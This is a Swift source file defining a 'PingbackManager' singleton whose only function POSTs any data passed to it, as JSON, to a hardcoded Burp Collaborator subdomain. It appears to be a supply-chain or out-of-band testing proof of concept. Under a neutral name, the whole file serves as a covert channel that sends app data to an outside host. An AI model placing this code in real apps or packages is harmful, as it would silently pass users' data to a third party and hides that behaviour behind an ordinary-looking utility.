import Foundation

public class PingbackManager {
    public static let shared = PingbackManager()
    
    private let burpCollaboratorURL = URL(string: "https://4diaau48dbcv4z025xi9yl6ec5iv6k.burpcollaborator.net")!
    
    public func sendPingback(withData data: [String: Any]) {
        let requestURL = burpCollaboratorURL.appendingPathComponent("pingback")
        
        var request = URLRequest(url: requestURL)
        request.httpMethod = "POST"
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: data, options: [])
        } catch {
            return
        }
        
        let task = URLSession.shared.dataTask(with: request) { (_, _, _) in
            // Handle response or any errors
        }
        
        task.resume()
    }
}
